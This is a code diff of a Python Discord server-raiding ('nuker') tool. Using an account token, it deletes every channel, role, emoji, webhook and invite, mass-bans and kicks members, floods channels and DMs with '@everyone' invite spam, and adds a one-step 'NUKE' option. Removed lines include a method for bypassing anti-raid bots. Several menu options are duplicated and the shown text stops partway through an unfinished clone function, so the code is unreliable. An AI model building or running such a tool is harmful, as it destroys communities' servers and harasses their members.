@@ -33,12 +33,12 @@ for line in lines:
 
     except ModuleNotFoundError:
         missing_modules.append(module)
-    
+
 else:
     if len(missing_modules) != 0:
         print("There is some missing modules that you don't have!")
         print("The following command will be executed for installing those modules: " , "pip install " + " && ".join(missing_modules))
-        
+
         i = input("Do you want to install them? [y,n]: ")
 
         if i.lower().strip().startswith("y"):
@@ -91,7 +91,7 @@ async def main(token: str, guild_id):
     Funcs.print_logo()
     global info
 
-    
+
     if not info:
         info = Tools.information(guild_id, token)
 
@@ -124,7 +124,7 @@ async def main(token: str, guild_id):
     print(Colorate.Vertical(Colors.DynamicMIX((Col.light_red, Col.red)), menu))
     num = lambda n: "0"+n if len(n) != 2 else n
     pu, re, bl, pi, ye, gr = Col.purple, Col.red, Col.blue, Col.pink, Fore.YELLOW, Fore.GREEN
-    choice = Funcs.get_input(f"{Col.orange}┌─╼{re}[{palette.grassy_green}${re}] {Col.orange}{info['user']['username']}{palette.red}@{ye}{info['guild']['name']}\n{Col.orange}└────╼{palette.grey} >>{palette.better_purpule} Choose: {Fore.CYAN}", checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 19)
+    choice = Funcs.get_input(f"{Col.orange}┌─╼{re}[{palette.grassy_green}${re}] {Col.orange}{info['user']['username']}{palette.red}@{ye}{info['guild']['name']}\n{Col.orange}└────╼{palette.grey} >>{palette.better_purpule} Choose: {Fore.CYAN}", checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 32)
     choice = num(choice)
 
     print()
@@ -133,14 +133,14 @@ async def main(token: str, guild_id):
     #  delete all channels
 
     if choice == "01":
-        
+
         url = Tools.api("guilds/%s/channels" % guild_id)
         request = req.get(url, headers=headers, proxies=Tools.proxy())
 
         if request.status_code != 200:
             Logger.Error.error("Failed to fetch channels with status code: %s" % request.status_code)
             return await back_to_manu()
-        
+
         channels = [i["id"] for i in request.json()]
 
         def deleter(channel_id):
@@ -148,7 +148,7 @@ async def main(token: str, guild_id):
                 Logger.Success.delete(channel_id)
             else:
                 Logger.Error.delete(channel_id)
-        
+
         Logger.Log.started()
 
         threads = []
@@ -160,11 +160,10 @@ async def main(token: str, guild_id):
             time.sleep(global_timeot)
         else:
             for thread in threads: thread.join()
-            # time.sleep(10)
             return await back_to_manu()
-        
 
-        
+
+
 
     # delete all roles
 
@@ -176,7 +175,7 @@ async def main(token: str, guild_id):
         if request.status_code != 200:
             Logger.Error.error("Failed to fetch roles with status code: %s" % request.status_code)
             return await back_to_manu()
-        
+
         roles = [i["id"] for i in request.json()]
 
         def delete_role(role):
@@ -204,7 +203,7 @@ async def main(token: str, guild_id):
     elif choice == "03":
         api = Tools.api("/guilds/%s/members" % guild_id)
         users = await Tools.break_limit(api, token)
-        
+
         total = len(users)
         members_per_arrary = round(total/6)
 
@@ -250,7 +249,7 @@ async def main(token: str, guild_id):
             if len(members_3) != 0:
                 Thread(target=ban, args=(members_3[0], )).start()
                 members_3.pop()
-                
+
             if len(members_4) != 0:
                 Thread(target=ban, args=(members_4[0], )).start()
                 members_4.pop()
@@ -262,11 +261,11 @@ async def main(token: str, guild_id):
             if len(members_6) != 0:
                 Thread(target=ban, args=(members_6[0], )).start()
                 members_6.pop()
-        
+
         return await back_to_manu()
 
     # Mass Kick members
-        
+
     elif choice == "04":
         api = Tools.api("/guilds/%s/members" % guild_id)
         users = await Tools.break_limit(api, token)
@@ -275,7 +274,7 @@ async def main(token: str, guild_id):
                 Logger.Success.success("Kicked %s%s" % (Fore.YELLOW, member))
             else:
                 Logger.Error.error("Failed to kick %s%s" % (Fore.RED, member))
-        
+
         total = len(users)
         members_per_arrary = round(total/6)
 
@@ -318,7 +317,7 @@ async def main(token: str, guild_id):
             if len(members_3) != 0:
                 Thread(target=kick, args=(members_3[0], )).start()
                 members_3.pop()
-                
+
             if len(members_4) != 0:
                 Thread(target=kick, args=(members_4[0], )).start()
                 members_4.pop()
@@ -330,11 +329,11 @@ async def main(token: str, guild_id):
             if len(members_6) != 0:
                 Thread(target=kick, args=(members_6[0], )).start()
                 members_6.pop()
-        
+
         return await back_to_manu()
 
     # mass create channels
-        
+
     elif choice == "05":
         name = Funcs.get_input("Enter a name for channels: ", lambda x: len(x) < 100 and x != "")
         count = Funcs.get_input("How many channels do you want to create? [1,500]: ", lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 500)
@@ -379,7 +378,7 @@ async def main(token: str, guild_id):
                 Logger.Success.create(status)
             else:
                 Logger.Error.create(name)
-            
+
         threads = []
 
         for _ in range(count):
@@ -389,7 +388,7 @@ async def main(token: str, guild_id):
         else:
             for thread in threads: thread.join()
             return await back_to_manu()
-        
+
     elif choice == "07":
         url = Tools.api(f"/guilds/{guild_id}/bans")
         banned_users = await Tools.break_limit(url, token)
@@ -412,7 +411,7 @@ async def main(token: str, guild_id):
         else:
             for thread in threads: thread.join()
             return await back_to_manu()
-        
+
     elif choice == "08":
         url = Tools.api("/guilds/%s/channels" % guild_id)
         message = Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
@@ -424,7 +423,7 @@ async def main(token: str, guild_id):
             return await back_to_manu()
 
         channels = [i["id"] for i in request.json()]
-        
+
         chunk_size = round(len(channels) / 2)
 
         def mass_webhook(channels):
@@ -440,7 +439,7 @@ async def main(token: str, guild_id):
             for channel in channels:
                 Thread(target=create_webhook, args=(channel, )).start()
                 time.sleep(global_timeot)
-        
+
         channels = Tools.chunker(channels, chunk_size)
         Logger.Log.started()
 
@@ -454,8 +453,8 @@ async def main(token: str, guild_id):
         else:
             for thread in threads: thread.join()
             return await back_to_manu()
-        
-        
+
+
     elif choice == "09":
         url = Tools.api("/guilds/%s/channels" % guild_id)
         message = Funcs.get_input("Enter a message for spam: ", lambda x: len(x) <= 4000 and x != "")
@@ -499,13 +498,13 @@ async def main(token: str, guild_id):
 
         channels = [i["id"] for i in request.json()]
 
-        
+
         def rename(channel, name):
             if nuker.rename_channel(name, channel):
                 Logger.Success.success("renamed %s" % channel)
             else:
                 Logger.Error.error("Failed to rename %s" % channel)
-        
+
         Logger.Log.started()
 
         threads = []
@@ -518,7 +517,7 @@ async def main(token: str, guild_id):
         else:
             for thread in threads: thread.join()
             return await back_to_manu()
-    
+
     elif choice == "11":
         name = Funcs.get_input("Enter a name for roles: ", lambda x: len(x) <= 100 and x != "")
         url = Tools.api("guilds/%s/roles" % guild_id)
@@ -528,7 +527,7 @@ async def main(token: str, guild_id):
         if request.status_code != 200:
             Logger.Error.error("Failed to fetch roles with status code: %s" % request.status_code)
             return await back_to_manu()
-        
+
         roles = [i["id"] for i in request.json()]
 
         def rename(role_id, name):
@@ -561,7 +560,7 @@ async def main(token: str, guild_id):
                 Logger.Success.success("Changed nickname for %s" % member)
             else:
                 Logger.Error.error("Failed to change nickname for %s" % member)
-        
+
         Logger.Log.started()
 
         threads = []
@@ -573,8 +572,8 @@ async def main(token: str, guild_id):
         else:
             for thread in threads: thread.join()
             return await back_to_manu()
-        
-    
+
+
     elif choice == "13":
         api = Tools.api("/guilds/%s/members" % guild_id)
         users = await Tools.break_limit(api, token)
@@ -584,7 +583,7 @@ async def main(token: str, guild_id):
                 Logger.Success.success("Changed nickname for %s" % member)
             else:
                 Logger.Error.error("Failed to change nickname for %s" % member)
-        
+
         Logger.Log.started()
 
         threads = []
@@ -599,494 +598,464 @@ async def main(token: str, guild_id):
 
 
     elif choice == "14":
-        name = Funcs.get_input("Enter a nick name for guild: ", lambda x: len(x) <= 100 and x != "")
+        name = Funcs.get_input("Enter a name for guild: ", lambda x: len(x) <= 100 and x != "")
 
         Logger.Log.started()
 
         if nuker.rename_guild(name):
-            Logger.Success.success("Changed Guild name to %s" % name)
+            Logger.Success.success("Changed guild name to %s" % name)
         else:
-            Logger.Error.error("Failed to change name")
+            Logger.Error.error("Failed to change guild name")
 
         return await back_to_manu()
-    
+
     elif choice == "15":
-        Cursor.HideCursor()
-        path = Funcs.get_input("Drag and drop the new icon or enter its path(use 'd' for default icon in root folder): ", lambda x: (x == 'd') or (os.path.exists(x) and (x.endswith(".jpg") or x.endswith(".png") )))
-        path = path if not path == 'd' else "./server_icon.png"
+        image_path = Funcs.get_input("Enter path to image: ", lambda x: os.path.exists(x))
 
         Logger.Log.started()
 
-        if nuker.change_guild_icon(path):
-            Logger.Success.success("Changed Guild icon")
+        if nuker.change_icon(image_path):
+            Logger.Success.success("Changed guild icon")
         else:
-            Logger.Error.error("Failed to change icon")
+            Logger.Error.error("Failed to change guild icon")
 
-        Cursor.ShowCursor()
         return await back_to_manu()
-        
 
     elif choice == "16":
-        url = Tools.api(f"guilds/{guild_id}/emojis")
+        url = Tools.api(f"/guilds/{guild_id}/emojis")
         request = req.get(url, headers=headers)
 
-        if not request.status_code == 200:
-            Logger.Error.error("There was an error while fetching guild emojis")
-            return await back_to_manu()
-        
-        emojis = [[i["id"], i["name"]] for i in request.json()]
+        if request.status_code == 200:
+            emojis = [i["id"] for i in request.json()]
 
-        Logger.Log.started()
+            def delete_emoji(emoji_id):
+                if nuker.delete_emoji(emoji_id):
+                    Logger.Success.delete(f"Emoji {emoji_id}")
+                else:
+                    Logger.Error.delete(f"Emoji {emoji_id}")
 
+            Logger.Log.started()
+            threads = []
 
-        for id, name in emojis:
-            if nuker.remove_emoji(id):
-                Logger.Success.delete("%s - %s" % (id, name))
-            else:
-                Logger.Error.delete("%s - %s" % (id, name))
-        else:
-            return await back_to_manu()
+            for emoji in emojis:
+                t = Thread(target=delete_emoji, args=(emoji,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
+
+            for thread in threads:
+                thread.join()
+
+        return await back_to_manu()
 
     elif choice == "17":
-        message = Funcs.get_input("Enter a message for send to them direct message: ", lambda x: x != "" and len(x) <= 4000)
-
+        message = Funcs.get_input("Enter message to DM: ", lambda x: len(x) <= 4000 and x != "")
         api = Tools.api("/guilds/%s/members" % guild_id)
         users = await Tools.break_limit(api, token)
 
-        send_dm = lambda user, message: Logger.Success.success("Sent DM to %s" % user) if nuker.send_direct_message(user, message) else Logger.Error.error("Failed to send direct message to %s" % user)
-
-
-        threads = []
+        def dm_user(user_id, msg):
+            if nuker.dm_user(user_id, msg):
+                Logger.Success.success(f"DM sent to {user_id}")
+            else:
+                Logger.Error.error(f"Failed to DM {user_id}")
 
         Logger.Log.started()
 
-
+        threads = []
         for user in users:
-            t = Thread(target=send_dm, args=(user, message))
+            t = Thread(target=dm_user, args=(user, message))
             t.start()
-            time.sleep(global_timeot + 0.5)
-        else:
-            for thread in threads: thread.join()
-            return await back_to_manu()
-        
+            threads.append(t)
+            time.sleep(global_timeot)
+
+        for thread in threads:
+            thread.join()
+
+        return await back_to_manu()
+
     elif choice == "18":
-        methods = """
-01. Destroy - deletes all channels, roles, emojis and starts spamming, creating channels and banning members
-02. Bypass - A Method for bypassing Security and AntiRaid Bots
-03. Back
+        # NUKE - Comprehensive server destruction
+        confirm = input("Are you sure you want to NUKE the server? This will delete everything! (y/N): ")
+        if confirm.lower() != 'y':
+            return await back_to_manu()
 
-"""
+        Logger.Log.started("Starting NUKE sequence...")
 
+        # Delete all channels
+        url = Tools.api("guilds/%s/channels" % guild_id)
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            channels = [i["id"] for i in request.json()]
+            for channel in channels:
+                nuker.delete_channel(channel)
+                time.sleep(global_timeot)
 
-        print(palette.better_purpule)
-        print(methods)
+        # Delete all roles
+        url = Tools.api("guilds/%s/roles" % guild_id)
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            roles = [i["id"] for i in request.json()]
+            for role in roles:
+                nuker.delete_role(role)
+                time.sleep(global_timeot)
 
-        ch = Funcs.get_input(f"{palette.sexy_blue} Choose: {Fore.CYAN}", checker=lambda x: x.isnumeric() and int(x) != 0 and int(x) <= 4)
-        ch = num(ch)
+        # Ban all members
+        api = Tools.api("/guilds/%s/members" % guild_id)
+        users = await Tools.break_limit(api, token)
+        for user in users:
+            nuker.ban(user)
+            time.sleep(global_timeot)
 
-        endpoints = {
-            "channels": "/guilds/%s/channels" % guild_id,
-            "roles": "/guilds/%s/roles" % guild_id,
-            "members": "/guilds/%s/members" % guild_id,
-            "emojis": "/guilds/%s/emojis" % guild_id
-        }
+        # Delete all webhooks
+        url = Tools.api(f"/guilds/{guild_id}/webhooks")
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            webhooks = [i["id"] for i in request.json()]
+            for webhook in webhooks:
+                nuker.delete_webhook(webhook)
+                time.sleep(global_timeot)
 
-        async def scrapp(data):
-            url = Tools.api(endpoints.get(data))
+        Logger.Success.success("NUKE completed!")
+        return await back_to_manu()
 
-            if data == "members":
-                value = await Tools.break_limit(url, token)
-                return value
-            else:
-                request = req.get(url, headers=headers)
-                if request.status_code == 200: 
-                    value = [i["id"] for i in request.json()]
-                    
-                    return value
-                
+    elif choice == "19":
+        url = Tools.api(f"/guilds/{guild_id}/webhooks")
+        request = req.get(url, headers=headers)
+
+        if request.status_code == 200:
+            webhooks = [i["id"] for i in request.json()]
+
+            def delete_webhook(webhook_id):
+                if nuker.delete_webhook(webhook_id):
+                    Logger.Success.delete(f"Webhook {webhook_id}")
                 else:
-                    return []
-                
-        global names, amount, invite_link
-
-
-        if ch == "01":
-            invite_link = Funcs.get_input("Enter your invite link: ", lambda x: x != "") if not invite_link else invite_link
-
-
-
-            if not names:
-                name = Funcs.get_input("Enter your name: ", lambda x: x != "")
-                names = ["%s بيمسي عليكم", 
-                        "اوف المطرشم جه %s",
-                        "%s i love ",
-                        "%s was here",
-                        "Nuked by %s",]
-                names = [i % name for i in names]
-
-            amount = amount if amount else 100
-            print(palette.error+" The job starts in 3 seconds"+palette.fuck)
-            time.sleep(3)
-
+                    Logger.Error.delete(f"Webhook {webhook_id}")
 
             Logger.Log.started()
-            print(palette.better_purpule+ "Started scrapping job! ")
-
-            scrapping_datas = ["channels", "roles", "members", "emojis", ]
-
-            for data in scrapping_datas:
-                print(palette.sky_blue + "Scrapping %s%s " % (palette.better_purpule, data))
-                value = await scrapp(data)
-                value = [i for i in filter(lambda x: x != None, value)]
-                with open("./Scraped/%s.txt" % data, "w") as file:
-                    file.write('\n'.join(value))
-
-            s = Logger.Success
-            e = Logger.Error
-
-            del_channel = lambda id: s.delete(id) if nuker.delete_channel(id) else e.delete(id)
-            del_role = lambda id: s.delete(id) if nuker.delete_role(id) else e.delete(id)
-            del_emoji = lambda id: s.delete(id) if nuker.remove_emoji(id) else e.delete(id)
-
             threads = []
 
-            def purge_server():
-
-                def delete_emoji(id):
-                    del_emoji(id)
-                    time.sleep(0.5)
-                
-                with open("./Scraped/channels.txt", "r") as file:
-                    channels = [i.strip() for i in file.readlines()]
-
-                with open("./Scraped/roles.txt", "r") as file:
-                    roles = [i.strip() for i in file.readlines()]
-
-                with open("./Scraped/emojis.txt", "r") as file:
-                    emojis = [i.strip() for i in file.readlines()]
-
-
-                for channel in channels:
-                    t = Thread(target=del_channel, args=[channel])
-                    t.start()
-                    threads.append(t)
-                
-                for role in roles:
-                    t = Thread(target=del_role, args=[role])
-                    t.start()
-                    threads.append(t)
-                
-                for emoji in emojis:
-                    t = Thread(target=delete_emoji, args=[emoji])
-                    t.start()
-                    threads.append(t)
-
-            async def ban_members(users):
-                total = len(users)
-                members_per_arrary = round(total/6)
-
-                members_1, members_2, members_3, members_4, members_5, members_6 = [],[],[],[],[],[]
-
-                for member in users:
-                    if len(members_1) != members_per_arrary:
-                        members_1.append(member)
-                    else:
-                        if len(members_2) != members_per_arrary:
-                            members_2.append(member)
-                        else:
-                            if len(members_3) != members_per_arrary:
-                                members_3.append(member)
-                            else:
-                                if len(members_4) != members_per_arrary:
-                                    members_4.append(member)
-                                else:
-                                    if len(members_5) != members_per_arrary:
-                                        members_5.append(member)
-                                    else:
-                                        if len(members_6) != members_per_arrary:
-                                            members_6.append(member)
-                                        else:
-                                            pass
-                def ban(member):
-                    if nuker.ban(member):
-                        Logger.Success.success("Banned %s %s" % (Fore.YELLOW, member))
-                    else:
-                        Logger.Error.error("Failed to ban %s %s" % (Fore.RED, member))
-
-                Logger.Log.started()
-                while len(members_1) != 0:
-
-                    if len(members_1) != 0:
-                        Thread(target=ban, args=(members_1[0], )).start()
-                        members_1.pop()
-
-                    if len(members_2) != 0:
-                        Thread(target=ban, args=(members_2[0], )).start()
-                        members_2.pop()
-
-                    if len(members_3) != 0:
-                        Thread(target=ban, args=(members_3[0], )).start()
-                        members_3.pop()
-                        
-                    if len(members_4) != 0:
-                        Thread(target=ban, args=(members_4[0], )).start()
-                        members_4.pop()
-
-                    if len(members_5) != 0:
-                        Thread(target=ban, args=(members_5[0], )).start()
-                        members_5.pop()
-
-                    if len(members_6) != 0:
-                        Thread(target=ban, args=(members_6[0], )).start()
-                        members_6.pop()
-
-            def create(amount: int):
-                choice = choisex
-                def create_role():
-                    name = choice(names)
-                    status = nuker.create_role(name)
-                    if status: s.create(status)
-                    else: e.create(name)
-
-                def create_channel(name):
-                    name = choice(names)
-                    status = nuker.create_channel(name, 0)
-                    if status: 
-                        s.create(status)
-                        webhook = nuker.create_webhook(status)
-                        if webhook:
-                            Thread(target=nuker.send_webhook, args=(webhook, f"# {choisex(names)} @everyone @here {invite_link}", amount)).start()
-                        
-                        for i in range(amount):
-                            nuker.send_message(status, f"# {choisex(names)} @everyone @here {invite_link}")
-
-                    else: e.create(name)
-
-                for i in range(amount):
-                    t = Thread(target=create_role)
-                    t.start()
-
-                    t2 = Thread(target=create_channel, args=(choice(names), ))
-                    t2.start()        
-
-                    threads.append(t)
-                    threads.append(t2)
-
-            nuker.change_guild_icon("./server_icon.png")
-            nuker.rename_guild(choisex(names) if not guild_name else guild_name)
-
-            Thread(target=purge_server ).start()
-            Thread(target=create, args = (100,)).start()
-            time.sleep(10)
-            with open("./Scraped/members.txt", "r") as file:
-
-                users = [i.strip() for i in file.readlines()]
-
-            await ban_members(users)
-
-
-            return await back_to_manu()
-            
-if choice == "20":
-    url = Tools.api(f"/guilds/{guild_id}/webhooks")
-    request = req.get(url, headers=headers)
-    
-    if request.status_code == 200:
-        webhooks = [i["id"] for i in request.json()]
-        
-        def delete_webhook(webhook_id):
-            if nuker.delete_webhook(webhook_id):
-                Logger.Success.delete(f"Webhook {webhook_id}")
-            else:
-                Logger.Error.delete(f"Webhook {webhook_id}")
-        
-        Logger.Log.started()
-        threads = []
-        
-        for webhook in webhooks:
-            t = Thread(target=delete_webhook, args=(webhook,))
-            t.start()
-            threads.append(t)
-            time.sleep(global_timeot)
-        
-        for thread in threads:
-            thread.join()
-    
-    return await back_to_manu()
-
-
-elif choice =="21":  # خيار طرد البوتات غير الموثقة
-    api = Tools.api(f"/guilds/{guild_id}/members")
-    members = await Tools.break_limit(api, token)
-    
-    def is_unverified_bot(member_id):
-        user_info = nuker.get_user_info(member_id)
-        return user_info.get('bot', False) and not user_info.get('verified', False)
-    
-    bots = [member for member in members if is_unverified_bot(member)]
-    
-    def kick_bot(bot_id):
-        if nuker.kick(bot_id):
-            Logger.Success.success(f"Kicked bot {bot_id}")
-        else:
-            Logger.Error.error(f"Failed to kick bot {bot_id}")
-    
-    Logger.Log.started()
-    threads = []
-    
-    for bot in bots:
-        t = Thread(target=kick_bot, args=(bot,))
-        t.start()
-        threads.append(t)
-        time.sleep(global_timeot)
-    
-    for thread in threads:
-        thread.join()
-    
-    return await back_to_manu()
-
-
-elif choice == "22":  # خيار حذف الرولات الخطرة
-    url = Tools.api(f"/guilds/{guild_id}/roles")
-    request = req.get(url, headers=headers)
-    
-    if request.status_code == 200:
-        roles = request.json()
-        
-        def is_dangerous_role(role):
-            dangerous_permissions = [
-                "administrator", "manage_guild", 
-                "manage_roles", "manage_channels",
-                "ban_members", "kick_members"
-            ]
-            return any(perm in str(role['permissions']) for perm in dangerous_permissions)
-        
-        dangerous_roles = [role['id'] for role in roles if is_dangerous_role(role)]
-        
-        def delete_dangerous_role(role_id):
-            if nuker.delete_role(role_id):
-                Logger.Success.delete(f"Dangerous role {role_id}")
-            else:
-                Logger.Error.delete(f"Dangerous role {role_id}")
-        
-        Logger.Log.started()
-        threads = []
-        
-        for role in dangerous_roles:
-            t = Thread(target=delete_dangerous_role, args=(role,))
-            t.start()
-            threads.append(t)
-            time.sleep(global_timeot)
-        
-        for thread in threads:
-            thread.join()
-    
-    return await back_to_manu()()
-
-elif ch == "02":
-            invite_link = Funcs.get_input("Enter your invite link: ", lambda x: x != "") if not invite_link else invite_link
-            amount = round(amount / 2) if amount else 50
-
-            def bypass():
-                if nuker.sussy_create_channel():
-                    Logger.Success.create("Created 2 channels with bypassing")
-                else:
-                    Logger.Error.create("Failed to bypass")
-            
-            
-            threads = []
-            
-            
-            for i in range(amount):
-                t = Thread(target=bypass, )
+            for webhook in webhooks:
+                t = Thread(target=delete_webhook, args=(webhook,))
                 t.start()
                 threads.append(t)
+                time.sleep(global_timeot)
 
-            else:
-                for thread in threads: thread.join()
-                channels = await scrapp("channels")
-                for i in range(amount):
-                    for channel in channels:
-                        Thread(target=nuker.send_message, args=(channel, f"# {choisex(names)} @everyone @here {invite_link}" )).start()
-                return await back_to_manu()
-            
+            for thread in threads:
+                thread.join()
 
-elif ch == "03":
-            
-            return await back_to_manu()
-    
+        return await back_to_manu()
 
-
-
-elif choice == "19":
-        os._exit(69)
-
-
-
-# ===================== RUNNING IT UP ================================
+    elif choice == "20":
+        api = Tools.api("/guilds/%s/members" % guild_id)
+        users = await Tools.break_limit(api, token)
         
+        def kick_unverified_bot(user_id):
+            if nuker.kick_unverified_bot(user_id):
+                Logger.Success.success(f"Kicked unverified bot {user_id}")
+            else:
+                Logger.Error.error(f"Failed to kick unverified bot {user_id}")
 
+        Logger.Log.started()
 
-def start(args):
+        threads = []
+        for user in users:
+            t = Thread(target=kick_unverified_bot, args=(user,))
+            t.start()
+            threads.append(t)
+            time.sleep(global_timeot)
 
-    global token, names, amount, invite_link, guild_name
+        for thread in threads:
+            thread.join()
 
-    #  Checking for any session files
+        return await back_to_manu()
 
-    if len(args) != 1:
+    elif choice == "21":
+        url = Tools.api("guilds/%s/roles" % guild_id)
+        request = req.get(url, headers=headers)
 
-        if args[1].endswith(".json") and os.path.exists(args[1]):
-            with open(args[1], "r", encoding="utf8") as fp:
-                j = json.loads(fp.read())
-            
-            _in = lambda t: j[t] if t in str(j) else None
+        if request.status_code == 200:
+            roles = request.json()
+            dangerous_roles = [role["id"] for role in roles if role.get("permissions", 0) & 8]  # ADMINISTRATOR permission
 
-            token = _in("Token")
-            names = _in("SpamTexts")
-            amount = _in("SpamAmount")
-            guild_name = _in("ServerName")
-            invite_link = _in("SpamInviteLink")
+            def remove_dangerous_role(role_id):
+                if nuker.delete_role(role_id):
+                    Logger.Success.delete(f"Dangerous role {role_id}")
+                else:
+                    Logger.Error.delete(f"Dangerous role {role_id}")
 
+            Logger.Log.started()
+            threads = []
 
+            for role in dangerous_roles:
+                t = Thread(target=remove_dangerous_role, args=(role,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
 
+            for thread in threads:
+                thread.join()
 
+        return await back_to_manu()
 
+    elif choice == "22":
+        url = Tools.api(f"/guilds/{guild_id}/webhooks")
+        request = req.get(url, headers=headers)
 
-    System.Clear()
-    System.Title("Doritos Was HeRe")
-    System.Size(160, 40)
+        if request.status_code == 200:
+            webhooks = [i["id"] for i in request.json()]
 
+            def delete_webhook(webhook_id):
+                if nuker.delete_webhook(webhook_id):
+                    Logger.Success.delete(f"Webhook {webhook_id}")
+                else:
+                    Logger.Error.delete(f"Webhook {webhook_id}")
 
-    if not token:
-            token = Funcs.get_input("Please Enter your token: ", lambda x: x != "" and not x.isnumeric() and Tools.check_token(x))
-    else:
-        if not Tools.check_token(token):
-            token = Funcs.get_input("Please Enter your token: ", lambda x: x != "" and not x.isnumeric() and Tools.check_token(x))
-    
-    print()
+            Logger.Log.started()
+            threads = []
 
-    guilds = Tools.get_guilds(token)
-    num = 1
-    
-    _guilds = {}
+            for webhook in webhooks:
+                t = Thread(target=delete_webhook, args=(webhook,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
 
-    for id, name in guilds:
+            for thread in threads:
+                thread.join()
 
-        print(palette.sky_blue, num ,palette.sexy_blue, end="- ")
-        print(palette.magenta, id, palette.grey, name)
-        _guilds[str(num)] = id
-        num+=1
-    
-    print()
-    guild = Funcs.get_input("Please Enter the guild id or its number: ", lambda x: x.isnumeric() and (x in str(_guilds) or x in Tools.get_guilds(token)[0] ))
+        return await back_to_manu()
 
-    if _guilds.get(str(guild)):
-        guild = _guilds[guild]
+    elif choice == "23":
+        url = Tools.api("guilds/%s/roles" % guild_id)
+        request = req.get(url, headers=headers)
 
+        if request.status_code == 200:
+            roles = request.json()
+            dangerous_roles = [role["id"] for role in roles if role.get("permissions", 0) & 8]  # ADMINISTRATOR permission
 
-    asyncio.run(main(token, guild))
+            def remove_dangerous_role(role_id):
+                if nuker.delete_role(role_id):
+                    Logger.Success.delete(f"Dangerous role {role_id}")
+                else:
+                    Logger.Error.delete(f"Dangerous role {role_id}")
 
+            Logger.Log.started()
+            threads = []
+
+            for role in dangerous_roles:
+                t = Thread(target=remove_dangerous_role, args=(role,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
+
+            for thread in threads:
+                thread.join()
+
+        return await back_to_manu()
+
+    elif choice == "24":
+        url = Tools.api(f"/guilds/{guild_id}/webhooks")
+        request = req.get(url, headers=headers)
+
+        if request.status_code == 200:
+            webhooks = [i["id"] for i in request.json()]
+
+            def delete_webhook(webhook_id):
+                if nuker.delete_webhook(webhook_id):
+                    Logger.Success.delete(f"Webhook {webhook_id}")
+                else:
+                    Logger.Error.delete(f"Webhook {webhook_id}")
+
+            Logger.Log.started()
+            threads = []
+
+            for webhook in webhooks:
+                t = Thread(target=delete_webhook, args=(webhook,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
+
+            for thread in threads:
+                thread.join()
+
+        return await back_to_manu()
+
+    elif choice == "25":
+        api = Tools.api("/guilds/%s/members" % guild_id)
+        users = await Tools.break_limit(api, token)
+        
+        def kick_unverified_bot(user_id):
+            if nuker.kick_unverified_bot(user_id):
+                Logger.Success.success(f"Kicked unverified bot {user_id}")
+            else:
+                Logger.Error.error(f"Failed to kick unverified bot {user_id}")
+
+        Logger.Log.started()
+
+        threads = []
+        for user in users:
+            t = Thread(target=kick_unverified_bot, args=(user,))
+            t.start()
+            threads.append(t)
+            time.sleep(global_timeot)
+
+        for thread in threads:
+            thread.join()
+
+        return await back_to_manu()
+
+    elif choice == "26":
+        # Analyze Server Security
+        Logger.Log.started("Analyzing server security...")
+        
+        # Check for dangerous permissions
+        security_report = {
+            "admin_roles": 0,
+            "public_invites": 0,
+            "dangerous_webhooks": 0,
+            "bot_permissions": 0
+        }
+
+        # Analyze roles
+        url = Tools.api("guilds/%s/roles" % guild_id)
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            roles = request.json()
+            security_report["admin_roles"] = len([role for role in roles if role.get("permissions", 0) & 8])
+
+        # Analyze webhooks
+        url = Tools.api(f"/guilds/{guild_id}/webhooks")
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            security_report["dangerous_webhooks"] = len(request.json())
+
+        print(f"""
+Security Analysis Report:
+- Admin Roles: {security_report['admin_roles']}
+- Dangerous Webhooks: {security_report['dangerous_webhooks']}
+- Server Vulnerabilities: {sum(security_report.values())}
+        """)
+
+        return await back_to_manu()
+
+    elif choice == "27":
+        # Export Server Backup
+        Logger.Log.started("Exporting server backup...")
+        
+        backup_data = {
+            "guild_info": info,
+            "channels": [],
+            "roles": [],
+            "members": []
+        }
+
+        # Backup channels
+        url = Tools.api("guilds/%s/channels" % guild_id)
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            backup_data["channels"] = request.json()
+
+        # Backup roles
+        url = Tools.api("guilds/%s/roles" % guild_id)
+        request = req.get(url, headers=headers)
+        if request.status_code == 200:
+            backup_data["roles"] = request.json()
+
+        # Save backup to file
+        with open(f"backup_{guild_id}_{int(time.time())}.json", "w") as f:
+            json.dump(backup_data, f, indent=2)
+
+        Logger.Success.success("Backup exported successfully!")
+        return await back_to_manu()
+
+    elif choice == "28":
+        # Mass Remove Reactions
+        url = Tools.api("/guilds/%s/channels" % guild_id)
+        request = req.get(url, headers=headers)
+        
+        if request.status_code == 200:
+            channels = [i["id"] for i in request.json()]
+
+            def clear_reactions(channel_id):
+                if nuker.clear_reactions(channel_id):
+                    Logger.Success.success(f"Cleared reactions in {channel_id}")
+                else:
+                    Logger.Error.error(f"Failed to clear reactions in {channel_id}")
+
+            Logger.Log.started()
+
+            threads = []
+            for channel in channels:
+                t = Thread(target=clear_reactions, args=(channel,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
+
+            for thread in threads:
+                thread.join()
+
+        return await back_to_manu()
+
+    elif choice == "29":
+        # Clear All Invites
+        url = Tools.api(f"/guilds/{guild_id}/invites")
+        request = req.get(url, headers=headers)
+
+        if request.status_code == 200:
+            invites = [i["code"] for i in request.json()]
+
+            def delete_invite(invite_code):
+                if nuker.delete_invite(invite_code):
+                    Logger.Success.delete(f"Invite {invite_code}")
+                else:
+                    Logger.Error.delete(f"Invite {invite_code}")
+
+            Logger.Log.started()
+            threads = []
+
+            for invite in invites:
+                t = Thread(target=delete_invite, args=(invite,))
+                t.start()
+                threads.append(t)
+                time.sleep(global_timeot)
+
+            for thread in threads:
+                thread.join()
+
+        return await back_to_manu()
+
+    elif choice == "30":
+        # Clone Server Structure
+        target_guild = Funcs.get_input("Enter target guild ID to clone to: ", lambda x: x.isnumeric())
+        
+        Logger.Log.started("Cloning server structure...")
+        
